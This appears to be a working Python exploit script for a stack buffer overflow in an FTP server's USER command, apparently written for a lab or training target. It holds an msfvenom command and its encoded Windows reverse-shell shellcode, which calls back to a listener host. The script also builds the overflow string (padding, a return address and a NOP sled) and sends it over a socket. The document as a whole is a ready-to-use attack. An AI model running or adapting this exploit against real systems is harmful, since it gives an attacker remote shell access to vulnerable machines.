#!/usr/bin/python
import sys
import socket

# found bad chars- \x00\x0a\x0d\x40
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=5555 EXITFUNC=thread -f c -a x86 -b "\x00\x0a\x0d"
overflow = (
	"\xba\x27\xb0\x98\x97\xdd\xc4\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
	"\x52\x83\xeb\xfc\x31\x53\x0e\x03\x74\xbe\x7a\x62\x86\x56\xf8"
	"\x8d\x76\xa7\x9d\x04\x93\x96\x9d\x73\xd0\x89\x2d\xf7\xb4\x25"
	"\xc5\x55\x2c\xbd\xab\x71\x43\x76\x01\xa4\x6a\x87\x3a\x94\xed"
	"\x0b\x41\xc9\xcd\x32\x8a\x1c\x0c\x72\xf7\xed\x5c\x2b\x73\x43"
	"\x70\x58\xc9\x58\xfb\x12\xdf\xd8\x18\xe2\xde\xc9\x8f\x78\xb9"
	"\xc9\x2e\xac\xb1\x43\x28\xb1\xfc\x1a\xc3\x01\x8a\x9c\x05\x58"
	"\x73\x32\x68\x54\x86\x4a\xad\x53\x79\x39\xc7\xa7\x04\x3a\x1c"
	"\xd5\xd2\xcf\x86\x7d\x90\x68\x62\x7f\x75\xee\xe1\x73\x32\x64"
	"\xad\x97\xc5\xa9\xc6\xac\x4e\x4c\x08\x25\x14\x6b\x8c\x6d\xce"
	"\x12\x95\xcb\xa1\x2b\xc5\xb3\x1e\x8e\x8e\x5e\x4a\xa3\xcd\x36"
	"\xbf\x8e\xed\xc6\xd7\x99\x9e\xf4\x78\x32\x08\xb5\xf1\x9c\xcf"
	"\xba\x2b\x58\x5f\x45\xd4\x99\x76\x82\x80\xc9\xe0\x23\xa9\x81"
	"\xf0\xcc\x7c\x05\xa0\x62\x2f\xe6\x10\xc3\x9f\x8e\x7a\xcc\xc0"
	"\xaf\x85\x06\x69\x45\x7c\xc1\x9c\x91\x7e\xb6\xc9\xa7\x7e\xad"
	"\xba\x21\x98\xa7\xac\x67\x33\x50\x54\x22\xcf\xc1\x99\xf8\xaa"
	"\xc2\x12\x0f\x4b\x8c\xd2\x7a\x5f\x79\x13\x31\x3d\x2c\x2c\xef"
	"\x29\xb2\xbf\x74\xa9\xbd\xa3\x22\xfe\xea\x12\x3b\x6a\x07\x0c"
	"\x95\x88\xda\xc8\xde\x08\x01\x29\xe0\x91\xc4\x15\xc6\x81\x10"
	"\x95\x42\xf5\xcc\xc0\x1c\xa3\xaa\xba\xee\x1d\x65\x10\xb9\xc9"
	"\xf0\x5a\x7a\x8f\xfc\xb6\x0c\x6f\x4c\x6f\x49\x90\x61\xe7\x5d"
	"\xe9\x9f\x97\xa2\x20\x24\xb7\x40\xe0\x51\x50\xdd\x61\xd8\x3d"
	"\xde\x5c\x1f\x38\x5d\x54\xe0\xbf\x7d\x1d\xe5\x84\x39\xce\x97"
	"\x95\xaf\xf0\x04\x95\xe5"
	)

crash = "A" * 230 + "\xf6\xb2\x14\x77" + "\x90" * 15 + overflow

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',21))
	s.recv(1024)
	message='USER ' + crash + '\r\n'
	s.send(message)
	s.send('QUIT\r\n')
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 